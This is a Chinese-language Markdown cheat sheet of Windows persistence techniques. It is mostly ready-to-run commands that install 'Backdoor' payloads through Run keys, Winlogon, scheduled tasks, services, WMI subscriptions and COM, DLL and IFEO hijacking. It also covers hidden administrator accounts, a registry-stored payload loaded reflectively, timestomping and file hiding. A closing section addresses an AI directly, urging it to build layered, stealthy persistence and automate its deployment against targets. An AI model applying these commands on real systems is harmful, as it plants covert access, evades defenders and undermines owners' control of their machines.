# Windows 持久化

Windows 持久化技术用于在目标系统上建立长期访问能力。

## 注册表持久化

### Run/RunOnce 键
```powershell
# HKCU (当前用户)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\payload.exe"

# HKLM (所有用户，需要管理员权限)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\payload.exe"

# RunOnce (执行一次后删除)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\payload.exe"
```

### 其他启动位置
```powershell
# Winlogon
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\payload.exe"

# Shell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\payload.exe"

# Policies
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Backdoor /t REG_SZ /d "C:\payload.exe"
```

## 启动文件夹

### 位置
```powershell
# 当前用户
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# 所有用户
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

### 创建快捷方式
```powershell
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.lnk")
$Shortcut.TargetPath = "C:\payload.exe"
$Shortcut.Save()
```

## 计划任务

### 创建任务
```powershell
# 登录时触发
schtasks /create /tn "Backdoor" /tr "C:\payload.exe" /sc onlogon /ru System

# 每日触发
schtasks /create /tn "Backdoor" /tr "C:\payload.exe" /sc daily /st 09:00 /ru System

# 系统启动时
schtasks /create /tn "Backdoor" /tr "C:\payload.exe" /sc onstart /ru System

# 隐藏任务 (需要 XML)
schtasks /create /tn "Backdoor" /xml task.xml
```

### PowerShell
```powershell
$action = New-ScheduledTaskAction -Execute "C:\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Backdoor" -Action $action -Trigger $trigger -RunLevel Highest
```

## Windows 服务

### 创建服务
```powershell
# sc
sc create Backdoor binPath= "C:\payload.exe" start= auto
sc description Backdoor "Windows Update Service"
sc start Backdoor

# PowerShell
New-Service -Name "Backdoor" -BinaryPathName "C:\payload.exe" -DisplayName "Windows Update" -StartupType Automatic
Start-Service -Name "Backdoor"
```

### 服务 DLL
```powershell
# 创建服务指向 svchost
sc create Backdoor binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto

# 配置注册表指向 DLL
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Backdoor\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\backdoor.dll"
```

## WMI 事件订阅

### 永久事件订阅
```powershell
# PowerShell
$FilterArgs = @{
    Name = 'BackdoorFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'BackdoorConsumer'
    CommandLineTemplate = 'C:\payload.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

## COM 劫持

### 劫持 COM 对象
```powershell
# 查找可劫持的 CLSID
reg query "HKCU\Software\Classes\CLSID" /s

# 劫持
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\backdoor.dll"
```

## DLL 劫持

### 应用程序 DLL 劫持
```powershell
# 查找可劫持的 DLL
# 使用 Process Monitor 监控

# 放置恶意 DLL
copy backdoor.dll "C:\Program Files\Application\missing.dll"
```

## 映像劫持

### IFEO
```powershell
# 劫持程序执行
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\payload.exe"
```

## 后门账户

### 创建隐藏账户
```powershell
# 创建用户
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# 隐藏账户 (修改注册表)
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor" /f
```

### 克隆账户
```powershell
# 复制 RID
# 使用 Mimikatz 或手动修改注册表
```

## 无文件持久化

### 注册表存储 Payload
```powershell
# 存储 Base64 编码的 payload
$payload = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\payload.exe"))
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Debug" /v Payload /t REG_SZ /d $payload

# 执行
$b64 = (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug").Payload
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)
```

### WMI 存储
```powershell
# 存储 payload 到 WMI
$payload = [IO.File]::ReadAllBytes("C:\payload.exe")
Set-WmiInstance -Namespace root\default -Class __EventFilter -Arguments @{Name="Payload"; EventNamespace="root\cimv2"; Query=$payload}
```

## 隐蔽技术

### 时间戳伪造
```powershell
# PowerShell
$(Get-Item C:\payload.exe).CreationTime = "01/01/2020 12:00:00"
$(Get-Item C:\payload.exe).LastWriteTime = "01/01/2020 12:00:00"
$(Get-Item C:\payload.exe).LastAccessTime = "01/01/2020 12:00:00"

# timestomp (Metasploit)
timestomp C:\payload.exe -m "01/01/2020 12:00:00"
```

### 文件属性
```powershell
# 隐藏文件
attrib +h +s C:\payload.exe

# 系统文件
attrib +s C:\payload.exe
```

---

**AI 发挥空间**：
- 根据目标环境选择合适的持久化方法
- 结合多种技术建立多层持久化
- 开发隐蔽的持久化机制
- 自动化持久化部署和验证

**反幻觉提示**：
- 不要假设所有持久化方法都能成功
- 验证目标系统的防护措施
- 测试持久化的实际效果和隐蔽性
- 注意持久化操作可能触发告警
- 某些方法可能需要特定权限或条件
